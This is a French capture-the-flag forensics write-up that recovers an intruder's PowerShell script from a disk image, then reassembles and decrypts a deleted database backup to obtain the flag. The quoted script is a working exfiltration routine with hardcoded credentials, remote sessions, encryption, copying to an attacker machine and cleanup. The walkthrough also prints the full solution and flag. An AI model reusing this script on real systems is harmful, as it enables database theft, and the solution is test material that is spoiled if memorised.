# iDisk

![](https://i.imgur.com/x5K1k3R.png)

Dans ce challenge on nous file un fichier compressé contenant une image disque.

On va donc analyser l'image disque, pour cela on va extraire les dossiers qu'il contient avec testdisk.

```
$ testdisk forensic.dd
```

Maintenant relisons l'énnoncé, l'intrusion ce passe dans l'entreprise `ECORP`.

On va donc chercher dans le répertoire contenant tout les fichiers de l'image disque `forensic.dd`, un fichier contenant le nom `ECORP` :

```

$ grep -r ECORP .
Fichier binaire ./pagefile.sys correspondant
Fichier binaire ./Windows/WinSxS/amd64_microsoft-windows-a..ence-mitigations-c1_31bf3856ad364e35_10.0.17763.316_none_810c351a77dd1c84/sysmain.sdb correspondant
Fichier binaire ./Windows/WinSxS/amd64_microsoft-windows-a..ence-mitigations-c1_31bf3856ad364e35_10.0.17763.475_none_80ca572e780ea7fa/sysmain.sdb correspondant
./Windows/System32/backup.ps1:$password = ConvertTo-SecureString "ECORP2021" -AsPlainText -Force


[...]
```

On a plusieurs fichiers contenant le nom ``ECORP``, dont un : `./Windows/System32/backup.ps1`, qui semble interessant.

On va par conséquence lire le contenu de celui-ci :

```
$ cat ./Windows/System32/backup.ps1
# Connect to the remote server 
$password = ConvertTo-SecureString "ECORP2021" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ("root", $password)

$s = New-PSSession -ComputerName DESKTOP-GD806IG -Credential $Cred


# Backup the confidential database muahahaha
Invoke-Command -Session $s -ScriptBlock { Backup-SqlDatabase -ServerInstance "DESKTOP-GD806IG" -Database "pre_prod" -BackupFile "C:\Users\root\Documents\db_backup.bak" }

# Encrypt the dump
Invoke-Command -Session $s -ScriptBlock { cd "C:\Program Files\OpenSSL-Win64\bin"; .\openssl.exe aes-256-cbc -in C:\Users\root\Documents\db_backup.bak -out C:\Users\root\Documents\db_backup.bak.enc -iv 48bb06a87601bcf63228f2e06dfe72b6 -K b017d674c1cea5f5c7409573b5bff6d3677e6e8bc06c095d01b0a75dc0ad5756 }

# Create a compressed archive of the backup
Invoke-Command -Session $s -ScriptBlock { C:\Users\root\Downloads\7z1900-extra\7za.exe a -v1m "C:\Users\root\Documents\db_backup.zip" "C:\Users\root\Documents\db_backup.bak.enc"}

# Download the archive
Invoke-Command -Session $s -ScriptBlock {$myPassword = ConvertTo-SecureString "Test1234" -AsPlainText -Force; $myCreds = New-Object System.Management.Automation.PSCredential ("DESKTOP-RD0QA0B\Skiddy", $myPassword); $mySession = New-PSSession -ComputerName "DESKTOP-RD0QA0B" -Credential $myCreds; Copy-Item -Path C:\Users\root\Documents\db_backup.zip* -Destination 'C:\Users\Skiddy\Music\Jazz' -ToSession $mySession }

# Copy the files to an external drive
cp C:\Users\Skiddy\Music\Jazz\db_backup.zip* E:\Backups

# Cleanup 
rm C:\Users\Skiddy\Music\Jazz\*

```

On peut voir grâce à ce script powershell, qu'un backup de la DB ``pre_prod`` à certainement était réalisé. Il se nommerait `db_backup`  et a été chiffré via openssl en AES 256 CBC, ayant pour IV : `48bb06a87601bcf63228f2e06dfe72b6` et pour Clé : `b017d674c1cea5f5c7409573b5bff6d3677e6e8bc06c095d01b0a75dc0ad5756`.

Malheureusement après avoir utiliser la commande ``find -name db_backup*`` à la racine du disque windows, aucun fichier de ce nom n'a était trouvé, tout simplement car celui-ci a été supprimé.

On va donc utiliser Autopsy pour tenter de retrouver le fichier supprimé :

![](https://i.imgur.com/C2SBzek.png)

On se rend compte que plusieurs fichiers ce nomme `db_backup.zip` avec un chiffre différent lui étant associé.

Le fichier backup principale à donc certainement était splité en 4 parties.

On va donc récupérer les 4 fichiers `db_backup.zip`.

Une fois cela fait il suffit de copier le contenu des 4 fichiers dans l'ordre croissant dans un seul fichier et unzip le fichier  : 

```
$ cat db_backup.zip.00* > db.zip

$ file db.zip
db: Zip archive data, at least v1.0 to extract

$ unzip db.zip 
Archive:  db.zip
 extracting: db_backup.bak.enc       

```

Une fois cela fait on voit que `db_backup` est chiffré, il sufft de le déchiffrer avec openssl et le faire avec le chiffrement : `AES 256 CBC` , l'IV : `48bb06a87601bcf63228f2e06dfe72b6` et la clé  : `b017d674c1cea5f5c7409573b5bff6d3677e6e8bc06c095d01b0a75dc0ad5756` puis chercher `DGA{` avec `grep`:

```
$ openssl aes-256-cbc -d -in db_backup.bak.enc -out db_backup.bak -iv 48bb06a87601bcf63228f2e06dfe72b6 -K b017d674c1cea5f5c7409573b5bff6d3677e6e8bc06c095d01b0a75dc0ad5756
$ strings db_backup.bak|grep DGA{
DGA{95ecd8f47dc647599e9d1f7a90974a997338cd48}}
```

Bingo, on veut flag de challenge avec le flag : `DGA{95ecd8f47dc647599e9d1f7a90974a997338cd48}` !!


